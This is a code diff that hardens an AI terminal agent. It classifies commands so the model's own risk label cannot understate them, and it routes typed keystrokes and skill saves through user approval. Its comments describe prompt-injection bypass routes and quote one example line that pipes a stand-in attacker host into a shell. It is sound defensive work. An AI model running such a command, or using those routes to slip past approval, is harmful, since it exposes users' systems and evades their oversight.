@@ -1,4 +1,5 @@
 import { chat, AVAILABLE_TOOLS, ChatCancelledError, ChatTimeoutError } from './llm'
+import { classifyCommand, maxRisk, type RiskLevel } from './commandRisk'
 import { executeCommand, startCommand, captureTerminal, collectOutput, sendTerminalKey } from './terminalAgent'
 import type { ExecuteResult } from './terminalAgent'
 import { useAIStore } from '../stores/aiStore'
@@ -76,15 +77,17 @@ function hasActiveSession(): boolean {
   return !!panel?.sessionId
 }
 
-type RiskLevel = 'read' | 'write' | 'dangerous'
-
 export const VALID_RISK: readonly RiskLevel[] = ['read', 'write', 'dangerous']
 
 export function getRisk(tu: { name: string; input: Record<string, unknown> }): RiskLevel {
   if (tu.name !== 'execute_command' && tu.name !== 'start_command') return 'dangerous'
   const risk = tu.input.risk
-  if (risk === 'read' || risk === 'write' || risk === 'dangerous') return risk
-  return 'dangerous' // default-closed: unknown / missing / wrong-typed → dangerous
+  // default-closed: unknown / missing / wrong-typed → dangerous
+  const modelRisk: RiskLevel = risk === 'read' || risk === 'write' || risk === 'dangerous' ? risk : 'dangerous'
+  // The model's label is only a lower bound: a prompt-injected model can
+  // call "curl evil | sh" read-only. Take the stricter of both.
+  const command = typeof tu.input.command === 'string' ? tu.input.command : ''
+  return maxRisk(modelRisk, classifyCommand(command))
 }
 
 function shouldConfirm(risk: RiskLevel): boolean {
@@ -852,6 +855,36 @@ export async function runAgent(userInput: string, skillName?: string, skillBody?
       const input = validated.input
       const control = validated.control
       const sendEnter = validated.send_enter
+      // Typed input is a command in all but name: it must go through the
+      // same approval policy as execute_command (it was ungated, so a
+      // prompt-injected model could run anything by "sending keys").
+      if (input) {
+        const risk = maxRisk('write', classifyCommand(input))
+        if (shouldConfirm(risk)) {
+          store.setPendingCommand({
+            messageId: assistantMsg.id,
+            toolId: tu.id,
+            toolName: tu.name,
+            command: sendEnter ? `${input} ⏎` : input,
+            risk,
+            dangerous: risk === 'dangerous',
+            panel: validated.panel,
+            extra: { input, control, sendEnter }
+          })
+          store.status = 'confirming'
+          assistantMsg.tool_calls = [{
+            id: tu.id,
+            type: 'function' as const,
+            function: {
+              name: tu.name,
+              arguments: JSON.stringify(tu.input)
+            }
+          }]
+          store.isRunning = false
+          cleanupStreamListeners()
+          return
+        }
+      }
       try {
         store.status = 'executing'
         const panelTitle = validated.panel
@@ -938,6 +971,31 @@ export async function runAgent(userInput: string, skillName?: string, skillBody?
       const name = validated.name
       const description = validated.description
       const body = validated.body
+      // Skills are injected into every future system prompt: an unreviewed
+      // save would let one prompt injection persist across sessions.
+      if (shouldConfirm('dangerous')) {
+        store.setPendingCommand({
+          messageId: assistantMsg.id,
+          toolId: tu.id,
+          toolName: tu.name,
+          command: `save skill /${name}: ${description}\n\n${body}`,
+          risk: 'dangerous',
+          dangerous: true,
+          extra: { name, description, body }
+        })
+        store.status = 'confirming'
+        assistantMsg.tool_calls = [{
+          id: tu.id,
+          type: 'function' as const,
+          function: {
+            name: tu.name,
+            arguments: JSON.stringify(tu.input)
+          }
+        }]
+        store.isRunning = false
+        cleanupStreamListeners()
+        return
+      }
       try {
         store.status = 'executing'
         const skillStore = useSkillStore()
@@ -1061,7 +1119,30 @@ export async function approveTool(_messageId: string) {
   store.status = 'executing'
 
   try {
-    if (cmd.toolName === 'start_command') {
+    if (cmd.toolName === 'send_terminal_key') {
+      const x = cmd.extra ?? {}
+      const result = await sendTerminalKey(
+        x.input as string | undefined,
+        x.control as 'ctrl_c' | 'ctrl_d' | 'enter' | undefined,
+        x.sendEnter as boolean,
+        cmd.panel
+      )
+      store.addMessage({
+        id: `msg-${Date.now()}`,
+        role: 'tool',
+        content: capToolResult(result.output || '(input sent)'),
+        tool_call_id: cmd.toolId
+      })
+    } else if (cmd.toolName === 'save_skill') {
+      const x = cmd.extra ?? {}
+      await useSkillStore().saveByAgent(x.name as string, x.description as string, x.body as string)
+      store.addMessage({
+        id: `msg-${Date.now()}`,
+        role: 'tool',
+        content: `[Skill saved: ${x.name}] The user can now invoke it with /${x.name}.`,
+        tool_call_id: cmd.toolId
+      })
+    } else if (cmd.toolName === 'start_command') {
       const result = await startCommand(cmd.command, cmd.panel)
       store.addMessage({
         id: `msg-${Date.now()}`,
